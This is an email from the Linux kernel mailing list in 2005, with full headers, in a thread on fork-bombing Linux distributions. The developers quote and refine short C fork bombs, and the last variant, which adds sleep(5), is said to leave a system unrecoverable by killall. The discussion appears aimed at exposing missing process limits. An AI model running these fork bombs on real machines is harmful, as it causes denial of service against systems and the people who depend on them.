Return-Path: <linux-kernel-owner+willy=40w.ods.org-S261681AbVCWSpN@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S261681AbVCWSpN (ORCPT <rfc822;willy@w.ods.org>);
	Wed, 23 Mar 2005 13:45:13 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261662AbVCWSpN
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Wed, 23 Mar 2005 13:45:13 -0500
Received: from rproxy.gmail.com ([64.233.170.195]:15053 "EHLO rproxy.gmail.com")
	by vger.kernel.org with ESMTP id S262018AbVCWSot (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Wed, 23 Mar 2005 13:44:49 -0500
DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
        s=beta; d=gmail.com;
        h=received:message-id:date:from:reply-to:to:subject:cc:in-reply-to:mime-version:content-type:content-transfer-encoding:references;
        b=RUwj51TkwU+Vw7cTsVTrWfRc7gcQLJTTYAKymX0FNqGt3PKD5O8nwFqAiR8St43t3/Eon1h6nTz2KYLaX+7R0onm6uVaEm8S82nUcyChnwzIahMRD7c8KlO9oybAYdklyLbinP7pJFrVBANZDjElMwEbaNLQ6CFA0HYWEFDlUwk=
Message-ID: <9cde8bff05032310442a4247f2@mail.gmail.com>
Date: Thu, 24 Mar 2005 03:44:48 +0900
From: aq <aquynh@gmail.com>
Reply-To: aq <aquynh@gmail.com>
To: Paul Jackson <pj@engr.sgi.com>
Subject: Re: forkbombing Linux distributions
Cc: mlists@tanael.org, Hikaru1@verizon.net, linux-kernel@vger.kernel.org
In-Reply-To: <20050323100543.04e582e9.pj@engr.sgi.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=ISO-8859-1
Content-Transfer-Encoding: 7bit
References: <e0716e9f05032019064c7b1cec@mail.gmail.com>
	 <Pine.LNX.4.61.0503221247450.5858@yvahk01.tjqt.qr>
	 <20050322124812.GB18256@roll> <20050322125025.GA9038@roll>
	 <9cde8bff050323025663637241@mail.gmail.com>
	 <1111581459.27969.36.camel@nc>
	 <9cde8bff05032305044f55acf3@mail.gmail.com>
	 <1111586058.27969.72.camel@nc>
	 <9cde8bff05032309056c9643a7@mail.gmail.com>
	 <20050323100543.04e582e9.pj@engr.sgi.com>
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

On Wed, 23 Mar 2005 10:05:43 -0800, Paul Jackson <pj@engr.sgi.com> wrote:
> > int main() { while(1) { fork(); fork(); exit(); } }
> > ...
> > the above forkbomb will stop quickly
> 
> Yep.
> 
> Try this forkbomb:
> 
>   int main() { while(1) { if (!fork()) continue; if (!fork()) continue; exit(); } }
> 

yep, that is better. but system can still be recovered by killall. 

a little "sleep" will render the system completely useless, like this:

int main() { while(1) { if (!fork()) continue; if (!fork()) continue;
sleep(5); exit(0); } }

thank you,
aq
